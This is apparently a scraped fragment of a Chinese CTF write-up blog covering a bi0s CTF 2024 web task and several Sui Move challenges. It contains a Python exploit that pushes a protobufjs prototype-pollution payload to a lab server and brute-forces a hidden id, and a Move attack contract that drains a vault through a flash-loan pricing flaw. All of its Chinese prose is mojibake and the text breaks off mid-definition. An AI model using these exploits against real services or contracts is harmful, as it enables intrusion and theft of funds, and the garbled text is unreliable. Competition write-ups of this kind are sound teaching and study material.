\u0026#39;http://192.168.72.137:3000\u0026#39; flagid = \u0026#39;\u0026#39; characters = \u0026#39;abcdefghijklmnopqrstuvwxyz0123456789\u0026#39; pollu = \u0026#39;option(a).constructor.prototype._peername.address = \u0026#34;127.0.0.1\u0026#34;;\u0026#39;.strip() sp = requests.post(base_url+\u0026#39;/customise\u0026#39;,json={ \u0026#34;data\u0026#34; : [ {\u0026#34;title\u0026#34; : \u0026#34;optional\u0026#34;}, {\u0026#34;author\u0026#34; : pollu + \u0026#34;optional\u0026#34;} ] }) sp = requests.post(base_url+\u0026#39;/create\u0026#39;,json={\u0026#34;asd\u0026#34; : \u0026#34;asd\u0026#34;}) for i in range(16): for l in characters: noteid = flagid + l print(noteid,end=\u0026#39;\\r\u0026#39;) sp = requests.get(base_url+\u0026#39;/search/\u0026#39;+noteid) if \u0026#39;Not found\u0026#39; in sp.text: continue elif \u0026#39;Internal server error\u0026#39; in sp.text: flagid = flagid + l break elif \u0026#39;Note found\u0026#39; in sp.text: flagid = flagid + l print(\u0026#34;flagid : \u0026#34;+flagid) exit() flagid = flagid + \u0026#39;_\u0026#39; print(\u0026#34;flagid : \u0026#34;+flagid) é¢„æœŸè§£ é¢„æœŸæ˜¯é€šè¿‡åŸå‹é“¾æ±¡æŸ“è®©botè®¿é—®æ—¶æ³¨å…¥æ¶æ„htmlæ ‡ç­¾å»æ³„éœ²flagidã€‚POC:https://gist.github.com/Ze-Pacifist/9bcd1072a62bbc5850322878b21bc8c8 ä¹‹å‰æåˆ°/searchä½¿ç”¨äº†globï¼Œé¢„æœŸè§£æ˜¯é€šè¿‡åŸå‹é“¾æ±¡æŸ“é€ æˆhtmlæ³¨å…¥ä½¿botè®¿é—®/searchæšä¸¾flagidçš„æ¯ä¸€ä½ã€‚botç¦ç”¨äº†jsï¼Œæ‰€ä»¥åªèƒ½æ³¨å…¥htmlæ ‡ç­¾æ‰“xsleakäº†ã€‚\nvarietynote å‚è€ƒ https://www.code-intelligence.com/blog/cve-protobufjs-prototype-pollution-cve-2023-36665 https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce https://hackmd.io/@r2dev2/Hkj7IhP3T https://gist.github.com/Ze-Pacifist/9bcd1072a62bbc5850322878b21bc8c8 https://gist.github.com/arkark/4a70a2df20da9732979a80a83ea211e2\n","permalink":"https://zoiltin.github.io/posts/bi0s-ctf-2024-wp/","summary":"required note ç”¨npm auditæœç´¢å†å²æ¼æ´ã€‚å‘ç°ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“çš„æ¼æ´ã€‚ POC:\nconst protobuf = require(\u0026#34;protobufjs\u0026#34;); protobuf.parse(\u0026#39;option(a).constructor.prototype.verified = true;\u0026#39;); console.log({}.verified); // returns true /createä¼šè¿›è¡Œprotojsè§£æã€‚\napp.post(\u0026#39;/create\u0026#39;, (req, res) =\u0026gt; { requestBody=req.body try{ schema = fs.readFileSync(\u0026#39;./settings.proto\u0026#39;, \u0026#39;utf-8\u0026#39;); root = protobuf.parse(schema).root; Note = root.lookupType(\u0026#39;Note\u0026#39;); [...] åœ¨/customiseå¯ä»¥ä¿®æ”¹settings.protoæ–‡ä»¶ã€‚\napp.post(\u0026#39;/customise\u0026#39;,(req, res) =\u0026gt; { try { const { data } = req.body; let author = data.pop()[\u0026#39;author\u0026#39;]; let title = data.pop()[\u0026#39;title\u0026#39;]; let protoContents = fs.readFileSync(\u0026#39;./settings.proto\u0026#39;, \u0026#39;utf-8\u0026#39;).split(\u0026#39;\\n\u0026#39;); if (author) { protoContents[5] = ` ${author} string author = 3 [default=\u0026#34;user\u0026#34;];`; } if (title) { protoContents[3] = ` ${title} string title = 1 [default=\u0026#34;user\u0026#34;];`; } fs.","title":"bi0s CTF 2024 wp"},{"content":"Checkin sorce:100\né¢˜ç›®æºç :\nmodule movectf::checkin { use sui::event; use sui::tx_context::{Self, TxContext}; const ESTRING:u64 = 0; struct Flag has copy, drop { sender: address, flag: bool, } public entry fun get_flag(string: vector\u0026lt;u8\u0026gt;, ctx: \u0026amp;mut TxContext) { assert!(string == b\u0026#34;MoveBitCTF\u0026#34;,ESTRING); event::emit(Flag { sender: tx_context::sender(ctx), flag: true, }); } } å¸¦ç€MoveBitCTFå­—ç¬¦ä¸²ä½œä¸ºå‚æ•°è°ƒç”¨get_flagå‡½æ•°ã€‚ä¼ å‚è¦ç”¨å­—èŠ‚ã€‚\n# è½¬æ¢ä¸ºåå…­è¿›åˆ¶ print(\u0026#34;0x\u0026#34;) for i in \u0026#34;MoveBitCTF\u0026#34;: print(hex(ord(i)).replace(\u0026#34;0x\u0026#34;,\u0026#34;\u0026#34;),end=\u0026#34;\u0026#34;) è°ƒç”¨å³å¯ï¼š\nsui client call --package package_id --module module_name --function get_flag --args 0x4d6f7665426974435446 --gas-budget 10000000 DynamicMatrixTraversal sorce: 200\nå…³é”®ä»£ç \npublic entry fun execute(record: \u0026amp;mut Record, m: u64, n: u64) { if (record.count_1 == 0) { let result: u64 = up(m, n); assert!(result == TARGET_VALUE_1, ERROR_RESULT_1); record.count_1 = m; record.count_2 = n; } else if (record.count_3 == 0) { let result: u64 = up(m, n); assert!(result == TARGET_VALUE_2, ERROR_RESULT_2); record.count_3 = m; record.count_4 = n; } } public entry fun get_flag(record: \u0026amp;Record, ctx: \u0026amp;mut TxContext) { assert!(record.count_1 \u0026lt; record.count_3, ERROR_PARAM_1); assert!(record.count_2 \u0026gt; record.count_4, ERROR_PARAM_2); event::emit(Flag { user: tx_context::sender(ctx), flag: true }); } å¾—åˆ°flagçš„æ¡ä»¶æ˜¯count_1 \u0026lt; count_3ä¸”count_2 \u0026gt; count_4ã€‚\nupå‡½æ•°ä½¿ç”¨åŠ¨æ€è§„åˆ’æ ¹æ®è¾“å…¥å‚æ•°må’Œnè®¡ç®—ä¸€ä¸ªå€¼ã€‚å®ƒä½¿ç”¨ä¸€ä¸ªå‘é‡çš„å‘é‡æ„å»ºä¸€ä¸ªå€¼çš„çŸ©é˜µï¼Œå¹¶ä»çŸ©é˜µçš„æœ€åä¸€è¡Œçš„æœ€åä¸€ä¸ªå…ƒç´ ä¸­æ£€ç´¢æ‰€éœ€çš„å€¼ã€‚\nè®©aiå°†upå‡½æ•°ç”¨pythoné‡å†™ç„¶åæœ¬åœ°è·‘ä¸€ä¸‹çš„åˆ°ä¸¤ç»„æ•°æ®ï¼Œ3-169å’Œ5-89ã€‚ é€šè¿‡executeå‡½æ•°å»èµ‹å€¼ï¼ˆæ•°å­—må’Œnä¼ é€’æ—¶è¦è½¬æ¢æˆåå…­è¿›åˆ¶ï¼‰ã€‚ç„¶åè°ƒç”¨get_flagå³å¯ã€‚\nSwap sorce: 200\né¢˜ç›®æºç ï¼š\nmodule swap::vault{ use sui::coin::{Self, Coin}; use sui::tx_context::{Self, TxContext}; use sui::balance::{Self, Balance}; use sui::object::{Self, ID, UID}; use sui::transfer; use sui::event; use swap::ctfa::{Self, MintA}; use swap::ctfb::{Self, MintB}; struct Vault\u0026lt;phantom A, phantom B\u0026gt; has key { id: UID, coin_a: Balance\u0026lt;A\u0026gt;, coin_b: Balance\u0026lt;B\u0026gt;, flashed: bool } struct Flag has copy, drop { win: bool, sender: address } struct Receipt { id: ID, a_to_b: bool, repay_amount: u64 } public entry fun initialize\u0026lt;A,B\u0026gt;(capa: MintA\u0026lt;A\u0026gt;, capb: MintB\u0026lt;B\u0026gt;,ctx: \u0026amp;mut TxContext) { let vault = Vault\u0026lt;A, B\u0026gt; { id: object::new(ctx), coin_a: coin::into_balance(ctfa::mint_for_vault(capa, ctx)), coin_b: coin::into_balance(ctfb::mint_for_vault(capb, ctx)), flashed: false }; transfer::share_object(vault); } public fun flash\u0026lt;A,B\u0026gt;(vault: \u0026amp;mut Vault\u0026lt;A,B\u0026gt;, amount: u64, a_to_b: bool, ctx: \u0026amp;mut TxContext): (Coin\u0026lt;A\u0026gt;, Coin\u0026lt;B\u0026gt;, Receipt) { assert!(!vault.flashed, 1); let (coin_a, coin_b) = if (a_to_b) { (coin::zero\u0026lt;A\u0026gt;(ctx), coin::from_balance(balance::split(\u0026amp;mut vault.coin_b, amount ), ctx)) } else { (coin::from_balance(balance::split(\u0026amp;mut vault.coin_a, amount ), ctx), coin::zero\u0026lt;B\u0026gt;(ctx)) }; let receipt = Receipt { id: object::id(vault), a_to_b, repay_amount: amount }; vault.flashed = true; (coin_a, coin_b, receipt) } public fun repay_flash\u0026lt;A,B\u0026gt;(vault: \u0026amp;mut Vault\u0026lt;A,B\u0026gt;, coina: Coin\u0026lt;A\u0026gt;, coinb: Coin\u0026lt;B\u0026gt;, receipt: Receipt) { let Receipt { id: _, a_to_b: a2b, repay_amount: amount } = receipt; if (a2b) { assert!(coin::value(\u0026amp;coinb) \u0026gt;= amount, 0); } else { assert!(coin::value(\u0026amp;coina) \u0026gt;= amount, 1); }; balance::join(\u0026amp;mut vault.coin_a, coin::into_balance(coina)); balance::join(\u0026amp;mut vault.coin_b, coin::into_balance(coinb)); vault.flashed = false; } public fun swap_a_to_b\u0026lt;A,B\u0026gt;(vault: \u0026amp;mut Vault\u0026lt;A,B\u0026gt;, coina:Coin\u0026lt;A\u0026gt;, ctx: \u0026amp;mut TxContext): Coin\u0026lt;B\u0026gt; { let amount_out_B = coin::value(\u0026amp;coina) * balance::value(\u0026amp;vault.coin_b) / balance::value(\u0026amp;vault.coin_a); coin::put\u0026lt;A\u0026gt;(\u0026amp;mut vault.coin_a, coina); coin::take(\u0026amp;mut vault.coin_b, amount_out_B, ctx) } public fun swap_b_to_a\u0026lt;A,B\u0026gt;(vault: \u0026amp;mut Vault\u0026lt;A,B\u0026gt;, coinb:Coin\u0026lt;B\u0026gt;, ctx: \u0026amp;mut TxContext): Coin\u0026lt;A\u0026gt; { let amount_out_A = coin::value(\u0026amp;coinb) * balance::value(\u0026amp;vault.coin_a) / balance::value(\u0026amp;vault.coin_b); coin::put\u0026lt;B\u0026gt;(\u0026amp;mut vault.coin_b, coinb); coin::take(\u0026amp;mut vault.coin_a, amount_out_A, ctx) } public fun get_flag\u0026lt;A,B\u0026gt;(vault: \u0026amp;Vault\u0026lt;A,B\u0026gt;, ctx: \u0026amp;TxContext) { assert!( balance::value(\u0026amp;vault.coin_a) == 0 \u0026amp;\u0026amp; balance::value(\u0026amp;vault.coin_b) == 0, 123 ); event::emit( Flag { win: true, sender: tx_context::sender(ctx) } ); } } ctfaå’Œctfbä¸­å®šä¹‰äº†ä¸¤ç§è´§å¸ï¼Œä¸æ˜¯é‡ç‚¹ï¼Œå°±ä¸æ”¾æºç äº†ã€‚\næä¾›äº†é—ªç”µè´·å’Œä¸¤ç§è´§å¸ç›¸äº’å…‘æ¢çš„åŠŸèƒ½ã€‚\nä»‹ç»ä¸€ä¸‹é—ªç”µè´· æºç ä¸­Receiptä½œä¸ºæ¬ æ¡ï¼Œåœ¨ç”¨æˆ·è´·æ¬¾æ—¶å‘é€ç»™ç”¨æˆ·ï¼Œç”±äºå…¶æ²¡æœ‰dropèƒ½åŠ›ï¼Œæ‰€ä»¥äº¤æ˜“ç»“æŸä¹‹å‰å¦‚æœæ²¡æœ‰è¢«è§£åŒ…å°±ä¼šæŠ¥é”™å¯¼è‡´äº¤æ˜“å¤±è´¥ã€‚ repay_flashå‡½æ•°å¯ä»¥è§£åŒ…receiptã€‚è¿™å°±æ„å‘³ç€è´·æ¬¾çš„å€Ÿå‡ºå’Œå½’è¿˜åªèƒ½åœ¨ä¸€ç¬”äº¤æ˜“ä¸­è¿›è¡Œï¼Œå°±æ˜¯è®©ä½ å€Ÿå‡ºå»æ‹¿è¿™äº›é’±å»å¥—åˆ©ï¼Œç„¶åé©¬ä¸Šè¿˜å›æ¥ï¼Œå¦‚æœä¸æ¢æˆ–è€…æ¢çš„ä¸å¤Ÿäº¤æ˜“å°±å¤±è´¥ï¼Œè¿™ç¬”äº¤æ˜“å°±ä¸ä¼šå†™å…¥é“¾ä¸Šã€‚\né¢˜è§£ ç”±äºå®šä¹‰äº†vault.flashedå˜é‡ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½ä¸€æ¬¡å€Ÿä¸€ç§è´§å¸ä¸”åœ¨æœªè¿˜æ¸…ä¹‹å‰ä¸èƒ½å†å€Ÿï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å…ˆå°†vaultä¸­æŸä¸€ç§è´§å¸æ¸…ç©ºï¼Œå†æŠŠå¦ä¸€ç§è´§å¸å€Ÿç©ºï¼Œç„¶åè°ƒç”¨get_flagï¼Œç„¶åå†è¿˜é’±å°±å¯ä»¥äº†ã€‚\nswap_a_to_bå’Œswap_b_to_aå¯ä»¥å°†ä¸¤ç§è´§å¸ç›¸äº’å…‘æ¢ï¼Œå…‘æ¢æ—¶æŒ‰ç…§æ¯”ä¾‹è¿›è¡Œå…‘æ¢ï¼Œä½†é—®é¢˜åœ¨äºï¼Œå…‘æ¢çš„æ¯”ç‡æ²¡æœ‰è€ƒè™‘è´·æ¬¾ã€‚ä»¥swap_a_to_bä¸ºä¾‹ï¼š\npublic fun swap_a_to_b\u0026lt;A,B\u0026gt;(vault: \u0026amp;mut Vault\u0026lt;A,B\u0026gt;, coina:Coin\u0026lt;A\u0026gt;, ctx: \u0026amp;mut TxContext): Coin\u0026lt;B\u0026gt; { // ä¼ å‚vaultä¸ºé“¶è¡Œï¼Œcoinaä¸ºæˆ‘ä»¬çš„Aè´§å¸ let amount_out_B = coin::value(\u0026amp;coina) * balance::value(\u0026amp;vault.coin_b) / balance::value(\u0026amp;vault.coin_a); // è®¡ç®—å‡ºå¯ä»¥å…‘æ¢çš„Bçš„æ•°é‡ï¼Œè¿™é‡Œåªè€ƒè™‘äº†vaultå†…çš„ä½™é‡ï¼Œæ²¡æœ‰åŠ ä¸Šæˆ‘ä»¬å·²ç»è´·å‡ºå»çš„ã€‚ coin::put\u0026lt;A\u0026gt;(\u0026amp;mut vault.coin_a, coina); coin::take(\u0026amp;mut vault.coin_b, amount_out_B, ctx) } vaultä¸­åˆå§‹æœ‰A,Bå„100ä¸ªï¼Œæ”»å‡»è€…åˆå§‹æ‹¥æœ‰A,Bå„10ä¸ªã€‚\næˆ‘å…ˆå€Ÿ90ä¸ªA åœ¨ç”¨10ä¸ªAå»æ¢Bï¼Œæ­¤æ—¶vaultä¸­ B/A = 10 ,æ‰€ä»¥10ä¸ªAå¯ä»¥è¿˜100ä¸ªBã€‚ åœ¨æŠŠ90ä¸ªAè¿˜å›å»ã€‚ é€šè¿‡è¿™ä¸‰æ­¥æ“ä½œï¼Œæˆ‘ä»¬æ‰‹ä¸Šæ‹¥æœ‰110ä¸ªBï¼ˆ10ä¸ªæœ¬æ¥æ‹¥æœ‰+vaultä¸­çš„100ä¸ªï¼‰å’Œ0ä¸ªAï¼ˆ10Aæ¢æˆäº†Bï¼‰ã€‚è€Œä¸”æ­¤æ—¶æ‰€æœ‰çš„æ¬ æ¬¾å‡å·²è¿˜æ¸…ã€‚ æœ€ååœ¨æŠŠvaultä¸­çš„110ä¸ªAå€Ÿå‡ºæ¥å°±å¯ä»¥äº†ã€‚ æ”»å‡»åˆçº¦: module zoiltin_solve_swap::exp{ use sui::coin::{Self,Coin}; use sui::tx_context::{Self,TxContext}; use sui::transfer; use sui::balance::{Self}; use swap::vault::{Self,Receipt}; public entry fun exp\u0026lt;A,B\u0026gt;(bank: \u0026amp;mut vault::Vault\u0026lt;A,B\u0026gt;,my_coin_a: Coin\u0026lt;A\u0026gt;,ctx: \u0026amp;mut TxContext){ // ä¼ å‚å¸¦è¿›æ¥vaultå’Œæˆ‘ä»¬åˆå§‹çš„10ä¸ªA let (coin_a_1,coin_b_1,receipt_1) = vault::flash\u0026lt;A,B\u0026gt;(bank,90,false,ctx); // å€Ÿ90ä¸ªA let coin_b_swap = vault::swap_a_to_b\u0026lt;A,B\u0026gt;(bank,my_coin_a,ctx); // 10Aä¸ªæ¢æˆB assert!(coin::value(\u0026amp;coin_b_swap) == 100, 12); // æ¢å‡ºæ¥çš„Bçš„æ•°é‡æ˜¯å¦ç­‰äº100 transfer::public_transfer(coin_b_swap,tx_context::sender(ctx)); // å°†100ä¸ªBä¼ é€’åˆ°æˆ‘ä»¬çš„åœ°å€ä¸Š vault::repay_flash\u0026lt;A,B\u0026gt;(bank,coin_a_1,coin_b_1,receipt_1); // è¿˜å€º90ä¸ªA let (coin_a_2,coin_b_2,receipt_2) = vault::flash\u0026lt;A,B\u0026gt;(bank,110,false,ctx); // å†å€Ÿ110ä¸ªA assert!(coin::value(\u0026amp;coin_a_2) == 110, 11); // ç¬¬äºŒæ¬¡å€Ÿå‡ºæ¥Açš„æ•°é‡æ˜¯å¦ç­‰äº110 vault::get_flag\u0026lt;A,B\u0026gt;(bank,ctx); // æ‹¿flag vault::repay_flash\u0026lt;A,B\u0026gt;(bank,coin_a_2,coin_b_2,receipt_2); // è¿˜é’±110A } } éƒ¨ç½²æ”»å‡»åˆçº¦ è¿™éƒ¨åˆ†ä¹Ÿè¯¥æä¸€ä¸‹ï¼Œç½‘ä¸Šçš„èµ„æ–™åŸºæœ¬éƒ½æ˜¯è‹±æ–‡çš„ã€‚\n#é¦–å…ˆåˆ›å»ºä¸€ä¸ªæ–°çš„åŒ… sui move new zoiltin_solve_swap #æ–‡ä»¶ç»“æ„å¦‚ä¸‹ï¼š #zoiltin_solve_swap/ #| /sources/ #| | exp.move #| /Move.toml Move.tomlå†…å®¹å¦‚ä¸‹ï¼š\n[package] name = \u0026#34;zoiltin_solve_swap\u0026#34; version = \u0026#34;0.0.1\u0026#34; [dependencies] Sui = { git = \u0026#34;https://github.com/MystenLabs/sui.git\u0026#34;, subdir = \u0026#34;crates/sui-framework/packages/sui-framework\u0026#34;, rev = \u0026#34;framework/testnet\u0026#34; } # Sui = { local = \u0026#34;/opt/sui/crates/sui-framework/packages/sui-framework\u0026#34; } swap = { local = \u0026#34;../swap\u0026#34; } [addresses] zoiltin_solve_swap = \u0026#34;0x0\u0026#34; swap = \u0026#34;package_id\u0026#34; sui = \u0026#34;0x2\u0026#34; addressesé‡Œé¢ï¼š0x0ä»£è¡¨æ­¤åŒ…å°šæœªå‘å¸ƒï¼Œæ„æ€å°±æ˜¯è¿™æ¬¡è¦å‘å¸ƒçš„åŒ…ã€‚å¦‚æœå·²ç»å‘å¸ƒäº†å°±åƒé¢˜ç›®ä¸­çš„swapåŒ…å°±å†™è¿™ä¸ªåŒ…çš„package_idä»¥åŠåœ¨published-até‡Œå†™ä¸Špackage_id\ndependenciesæ”¾æºä»£ç è·¯å¾„ã€‚\nswapæºç é‡Œçš„Move.tomlæ–‡ä»¶ä¹Ÿè¦æ”¹ï¼š\n[package] name = \u0026#34;swap\u0026#34; version = \u0026#34;0.0.1\u0026#34; published-at = \u0026#34;package_id\u0026#34; [dependencies] Sui = { git = \u0026#34;https://github.com/MystenLabs/sui.git\u0026#34;, subdir = \u0026#34;crates/sui-framework/packages/sui-framework\u0026#34;, rev = \u0026#34;framework/testnet\u0026#34; } # Sui = { local = \u0026#34;/opt/sui/crates/sui-framework/packages/sui-framework\u0026#34; } [addresses] swap = \u0026#34;package_id\u0026#34; åœ¨æ”»å‡»åˆçº¦ç›®å½•ä¸‹æ‰§è¡Œä»¥ä¸‹ä»£ç æ¥å‘å¸ƒåŒ…\nsui client publish --with-unpublished-dependencies --skip-dependency-verification --gas-budget 1000000000 å¯ä»¥æŸ¥çœ‹CTFAå’ŒCTFBä¸¤ä¸ªæ³›å‹çš„åœ°å€ã€‚ CTFAå’ŒCTFBä¸ºé¢˜ç›®å®šä¹‰çš„ä¸¤ç§å¸ï¼Œ\u0026ndash;type-argsè¦ä¼ å…¥CTFAå’ŒCTFBä½œä¸ºæ³›å‹ã€‚\nå…ˆè°ƒç”¨vaulté‡Œçš„initiateå‡½æ•°æ¥åˆå§‹åŒ–A,Bä¸ª10ä¸ªå¸ã€‚\nç„¶åè°ƒç”¨æ”»å‡»åˆçº¦ä¸­çš„expå‡½æ•°.sui client call --package \u0026lt;æ”»å‡»åˆçº¦çš„package_id\u0026gt; --module exp --function exp --type-args \u0026lt;\u0026lt;CTFAçš„è¯¦ç»†åœ°å€\u0026gt;,\u0026lt;CTFBçš„è¯¦ç»†åœ°å€\u0026gt;\u0026gt; --args \u0026lt;é‚£ä¸¤ä¸ªå‚æ•°\u0026gt; --gas-budget 10000000\nEasyGame æºç ï¼š\npublic fun submit_solution(user_input: vector\u0026lt;u64\u0026gt;,rc: \u0026amp;mut Challenge,ctx: \u0026amp;mut TxContext ){ let sender = sui::tx_context::sender(ctx); let houses = rc.initial_part; vector::append(\u0026amp;mut houses, user_input); let amount_robbed = rob(\u0026amp;houses); let result = amount_robbed == rc.target_amount; if (result) { event::emit(Flag { user: sender, flag: true }); }; } public fun rob(houses: \u0026amp;vector\u0026lt;u64\u0026gt;):u64{ let n = vector::length(houses); if (n ==0){ 0; }; let v = vector::empty\u0026lt;u64\u0026gt;(); vector::push_back(\u0026amp;mut v, *vector::borrow(houses, 0)); if (n\u0026gt;1){ vector::push_back(\u0026amp;mut v, math::max(*vector::borrow(houses, 0), *vector::borrow(houses, 1))); }; let i = 2; while (i \u0026lt; n) { let dp_i_1 = *vector::borrow(\u0026amp;v, i - 1); let dp_i_2_plus_house = *vector::borrow(\u0026amp;v, i - 2) + *vector::borrow(houses, i); vector::push_back(\u0026amp;mut v, math::max(dp_i_1, dp_i_2_plus_house)); i = i + 1; } ; *vector::borrow(\u0026amp;v, n - 1) } houseåˆå§‹å€¼ä¸º[1,2,4,5,1,3,6,7]ï¼Œéœ€è¦æˆ‘ä»¬åœ¨houseåè¿½åŠ ä¸€äº›æ•°æ®æ˜¯robå‡½æ•°è¿”å›22ã€‚ robå‡½æ•°æ˜¯ç”¨åŠ¨æ€è§„åˆ’è®¡ç®—åœ¨ä¸æŠ¢åŠ«ç›¸é‚»æˆ¿å±‹çš„æƒ…å†µä¸‹å¦‚ä½•åˆ©ç›Šæœ€å¤§ï¼Œå‘ç°æ·»åŠ ä¸€ä¸ªæ•°å­—9å°±å¯ä»¥ã€‚\næ”»å‡»åˆçº¦ module zoiltin_solve_easy_game::exp{ use std::vector; use sui::tx_context::TxContext; use easygame::easy_game::{Self,Challenge}; public entry fun exp(rc: \u0026amp;mut Challenge,ctx: \u0026amp;mut TxContext){ let payload = vector::empty\u0026lt;u64\u0026gt;(); vector::push_back(\u0026amp;mut payload,9); easy_game::submit_solution(payload,rc,ctx); } } Kitchen sorce: 200\né¢˜ç›®å…³é”®æºç ï¼š\npublic fun cook(olive_oils: vector\u0026lt;Olive_oil\u0026gt;, yeast: vector\u0026lt;Yeast\u0026gt;, flour: vector\u0026lt;Flour\u0026gt;, salt: vector\u0026lt;Salt\u0026gt;, status: \u0026amp;mut Status) { let l1 = vector::length\u0026lt;Olive_oil\u0026gt;(\u0026amp;olive_oils); let l2 = vector::length\u0026lt;Yeast\u0026gt;(\u0026amp;yeast); let l3 = vector::length\u0026lt;Flour\u0026gt;(\u0026amp;flour); let l4 = vector::length\u0026lt;Salt\u0026gt;(\u0026amp;salt); let cook1 = Cook {source : vector::empty\u0026lt;Olive_oil\u0026gt;()}; let cook2 = Cook {source : vector::empty\u0026lt;Yeast\u0026gt;()}; let cook3 = Cook {source : vector::empty\u0026lt;Flour\u0026gt;()}; let cook4 = Cook {source : vector::empty\u0026lt;Salt\u0026gt;()}; let i = 0; while(i \u0026lt; l1) { vector::push_back(\u0026amp;mut cook1.source, *vector::borrow(\u0026amp;olive_oils, i)); i = i + 1; }; i = 0; while(i \u0026lt; l2) { vector::push_back(\u0026amp;mut cook2.source, *vector::borrow(\u0026amp;yeast, i)); i = i + 1; }; i = 0; while(i \u0026lt; l3) { vector::push_back(\u0026amp;mut cook3.source, *vector::borrow(\u0026amp;flour, i)); i = i + 1; }; i = 0; while(i \u0026lt; l4) { vector::push_back(\u0026amp;mut cook4.source, *vector::borrow(\u0026amp;salt, i)); i = i + 1; }; let p = Pizza { olive_oils: cook1, yeast: cook2, flour: cook3, salt: cook4, }; assert!( bcs::to_bytes(\u0026amp;p) == x\u0026#34;0415a5b8a6f8c946bb0300bd9d997eb7038ad784faf2b802c5f122e1\u0026#34;, 0); status.status1 = true; } public fun recook (out: vector\u0026lt;u8\u0026gt;, status: \u0026amp;mut Status) { let p = Pizza { olive_oils: Cook\u0026lt;Olive_oil\u0026gt; { source: vector\u0026lt;Olive_oil\u0026gt;[ get_Olive_oil(0xb9d9), get_Olive_oil(0xeb54), get_Olive_oil(0x9268), get_Olive_oil(0xc5f7), get_Olive_oil(0xa1ec), get_Olive_oil(0xd084), ] }, yeast: Cook\u0026lt;Yeast\u0026gt; { source: vector\u0026lt;Yeast\u0026gt;[ get_Yeast(0xbd00), get_Yeast(0xfc81), get_Yeast(0x999d), get_Yeast(0xb77e), ] }, flour: Cook\u0026lt;Flour\u0026gt; { source: vector\u0026lt;Flour\u0026gt;[ get_Flour(0xdcc7), get_Flour(0xcc7a), get_Flour(0x8f19), get_Flour(0x96b1), get_Flour(0x8a6d), ] }, salt: Cook\u0026lt;Salt\u0026gt; { source: vector\u0026lt;Salt\u0026gt;[ get_Salt(0x8b01), get_Salt(0xf1c5), get_Salt(0xc6ec), ] }, }; assert!( bcs::to_bytes(\u0026amp;p) == out, 0); status.status2 = true; } éœ€è¦è®©è¿™ä¸¤ä¸ªå‡½æ•°è¿”å›trueã€‚æ¶‰åŠåˆ°åºåˆ—åŒ–ã€‚\nå…ˆçœ‹cookå‡½æ•° cookå‡½æ•°è¦æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªé…æ–¹å¯¹è±¡ï¼Œç„¶åæ¯”è¾ƒåºåˆ—åŒ–åæ˜¯å¦ä¸x\u0026quot;0415a5b8a6f8c946bb0300bd9d997eb7038ad784faf2b802c5f122e1\u0026quot;ç›¸ç­‰ã€‚\nBinary Canonical Serialization, BCS, æ˜¯åœ¨ Diem åŒºå—é“¾é¡¹ç›®ä¸­å¼€å‘å‡ºæ¥çš„åºåˆ—åŒ–æ ¼å¼ï¼Œç°åœ¨ä¹Ÿè¢«å¹¿æ³›åº”ç”¨äºå¤§éƒ¨åˆ†åŸºäº Move çš„åŒºå—é“¾ï¼Œæ¯”å¦‚Sui, Starcoin, Aptos, 0L. é™¤äº†åœ¨ Move VM è™šæ‹Ÿæœºä¸­ä½¿ç”¨ï¼ŒBCSä¹Ÿè¢«ç”¨åœ¨äº¤æ˜“ transaction å’Œäº‹ä»¶ event ç¼–ç ä¸­ï¼Œæ¯”å¦‚åœ¨ç­¾ç½²äº¤æ˜“ä¹‹å‰åšåºåˆ—åŒ–å¤„ç†ï¼Œè§£æäº‹ä»¶æ•°æ®ã€‚ ç›¸å…³èµ„æ–™ï¼šhttps://intro-zh.sui-book.com/advanced-topics/BCS_encoding/lessons/BCS_%E7%BC%96%E7%A0%81.html\næŸ¥é˜…èµ„æ–™å¾—çŸ¥ï¼š\nBCSæ˜¯ä¸€ç§æ•°æ®åºåˆ—åŒ–æ ¼å¼ï¼Œå…¶ç”Ÿæˆçš„è¾“å‡ºå­—èŠ‚ä¸åŒ…å«ä»»ä½•ç±»å‹ä¿¡æ¯ã€‚å› æ­¤ï¼Œæ¥æ”¶ç¼–ç å­—èŠ‚çš„ä¸€æ–¹éœ€è¦çŸ¥é“å¦‚ä½•ååºåˆ—åŒ–æ•°æ®\nBCS ä¸­æ²¡æœ‰æ•°æ®ç±»å‹ï¼Œå½“ç„¶ä¹Ÿæ²¡æœ‰ç»“æ„ä½“ structs; struct åªæ˜¯å®šä¹‰äº†å†…éƒ¨å­—æ®µ fields è¢«åºåˆ—åŒ–çš„é¡ºåº\næ„Ÿè§‰è¿™ä¸ªcè¯­è¨€ä¸­çš„åºåˆ—åŒ–æ¯”è¾ƒç›¸ä¼¼ï¼Œcè¯­è¨€ä¸­çš„å°†ç»“æ„ä½“ä»å†…å­˜ä¸­å†™å…¥äºŒè¿›åˆ¶æ–‡ä»¶æ—¶å°±æ˜¯ç›´æ¥åŸå°ä¸åŠ¨æŠŠå†…å­˜å†™å…¥æ–‡ä»¶ã€‚è€Œæ•°æ®æ ¼å¼å…¨é ç¨‹åºå‘˜è‡ªå®šä¹‰ã€‚\nçœ‹ä¸‹é¢è¿™ä¸ªä¾‹å­ä¾¿äºç†è§£ï¼š\nstruct Metadata has drop, copy { name: std::ascii::String } struct BCSObject has drop, copy { id: ID, owner: address, meta: Metadata } let (id, owner, meta) = ( bcs::peel_address(\u0026amp;mut bcs), bcs::peel_address(\u0026amp;mut bcs), bcs::peel_vec_u8(\u0026amp;mut bcs) ); ååºåˆ—åŒ–metaæ—¶ä½¿ç”¨çš„æ ¼å¼æ˜¯vector\u0026lt;u8\u0026gt;ï¼ˆ8ä½æ•´æ•°æ•°ç»„ï¼Œå°±æ˜¯std::ascii::Stringçš„æ ¼å¼ï¼‰ï¼Œä¹Ÿå°±æ˜¯è¯´åºåˆ—åŒ–æ—¶ç›´æ¥å¿½ç•¥äº†Metadataç»“æ„ä½“ï¼Œç›´æ¥æŠŠå¯¹è±¡ä»å†…å­˜ä¸­è½¬å‚¨æˆå­—èŠ‚ã€‚\nç„¶åå†çœ‹é¢˜ç›®ä¸­çš„ç»“æ„ï¼Œä»¥Olive_oilä¸ºä¾‹ï¼Œå…¶ä»–å››ç§é£Ÿæéƒ½ä¸€æ ·ï¼š\nstruct Olive_oil has copy, drop, store {amount: u16} struct Pizza has copy, drop, store { olive_oils: Cook\u0026lt;Olive_oil\u0026gt;, yeast: Cook\u0026lt;Yeast\u0026gt;, flour: 